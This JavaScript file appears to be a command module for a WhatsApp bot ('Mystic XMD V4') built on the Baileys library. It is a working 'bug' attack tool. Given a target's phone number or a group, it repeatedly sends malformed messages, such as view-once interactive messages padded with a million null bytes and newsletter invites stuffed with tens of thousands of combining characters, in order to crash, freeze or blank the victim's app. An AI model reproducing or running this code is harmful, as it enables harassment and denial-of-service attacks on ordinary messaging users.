const { generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys");
// const chalk = require('chalk'); // Removed as it was unused and missing from package.json

// Helper functions for bug payloads
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function bugMenuCommand(sock, from, msg, isOwner, args, command) {
    if (!isOwner) return sock.sendMessage(from, { text: '*ONLY OWNER CAN USE THIS*' }, { quoted: msg });

    const q = args.join(" ");
    if (!q && !msg.isGroup) return sock.sendMessage(from, { text: `*Format ❌*\nExample : .${command} 234xxx` }, { quoted: msg });

    let target = q ? q.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from;
    let pepec = target.split('@')[0];

    // Response message
    const responseText = `
╭─⦏ *MYSTIC BUG SYSTEM* ⦐
│ꔹ ᴄᴏᴍᴍᴀɴᴅ : ${command}
│ꔹ ᴛᴀʀɢᴇᴛ : ${pepec}
│ꔹ ᴀᴛᴛᴀᴄᴋ ᴜɴᴅᴇʀᴡᴀʏ ✓
╰───────────────────
© MYSTIC XMD V4`;

    await sock.sendMessage(from, { text: responseText }, { quoted: msg });

    try {
        switch (command) {
            case 'violet-destroy':
                for (let count = 0; count < 10; count++) {
                    await bug3(sock, target);
                    await sleep(1500);
                }
                break;

            case 'delay':
            case 'crash':
            case 'blank':
            case 'invis':
                await Combo(sock, target);
                await fcnew(sock, target);
                await XPhone(sock, target);
                break;

            case 'delayhard':
                await fcnew(sock, target);
                await Combo(sock, target);
                await XPhone(sock, target);
                break;

            case 'close-zapp':
            case 'bruteclose':
            case 'metaclose':
            case 'violet-infinity':
                await ForceClose(sock, target);
                await XPhone(sock, target);
                break;

            case 'buggc':
            case 'xgroup':
            case 'crashgc':
            case 'blankgc':
                if (!msg.isGroup) return sock.sendMessage(from, { text: 'Group only!' }, { quoted: msg });
                for (let i = 0; i < 5; i++) {
                    await bug3(sock, from);
                    await sleep(2000);
                }
                break;
        }
        await sock.sendMessage(from, { react: { text: "✅", key: msg.key } });
    } catch (e) {
        console.error(e);
        await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: msg });
    }
}

// --- Payload Functions ---

async function callinvisible(sock, target) {
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "Mystic Bug", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                },
                contextInfo: {
                    participant: { jid: target },
                    mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 100 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)]
                }
            }
        }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function ForceXFrezee(sock, target) {
    let crash = JSON.stringify({ action: "x", data: "x" });
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessageV2: {
            message: {
                listResponseMessage: {
                    title: "Mystic" + "ꦾ",
                    listType: 4,
                    buttonText: { displayText: "Crash" },
                    sections: [],
                    singleSelectReply: { selectedRowId: "crash" },
                    contextInfo: {
                        mentionedJid: [target],
                        externalAdReply: {
                            title: "Mystic XMD",
                            body: "Dangerous",
                            mediaType: 1,
                            nativeFlowButtons: [
                                { name: "payment_info", buttonParamsJson: crash },
                                { name: "call_permission_request", buttonParamsJson: crash }
                            ]
                        }
                    }
                }
            }
        }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function bug3(sock, target) {
    await killgc(sock, target);
    await rusuhgc(sock, target);
    await blankgc(sock, target);
}

async function killgc(sock, target) {
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\0".repeat(1000000),
                    version: 3
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 100 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    participant: target,
                    remoteJid: target
                }
            }
        }
    }, {});
    await sock.relayMessage(target, msg.message, {});
}

async function rusuhgc(sock, target) {
    const msg = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: "33333333333333333@newsletter",
                    newsletterName: "Mystic Mode" + "ꦾ".repeat(50000),
                    caption: "ꦽ".repeat(50000) + "@0".repeat(50000),
                    inviteExpiration: Date.now() + 1814400000
                }
            }
        }
    };
    await sock.relayMessage(target, msg, { userJid: target });
}

async function blankgc(sock, target) {
    await sock.relayMessage(target, {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363420088299543@newsletter",
            newsletterName: "Mystic Blank" + "XxX".repeat(5000),
            caption: "Mystic\n" + "XxX".repeat(5000),
            inviteExpiration: "0",
        },
    }, { userJid: target });
}

async function Combo(sock, target) {
    for (let i = 0; i < 5; i++) {
        await callinvisible(sock, target);
        await ForceXFrezee(sock, target);
    }
}

async function fcnew(sock, target) {
    for (let i = 0; i < 5; i++) {
        await callinvisible(sock, target);
        await ForceXFrezee(sock, target);
    }
}

async function ForceClose(sock, target) {
    for (let i = 0; i < 5; i++) {
        await callinvisible(sock, target);
    }
}

async function XPhone(sock, target) {
    await Combo(sock, target);
    await ForceXFrezee(sock, target);
}

module.exports = bugMenuCommand;
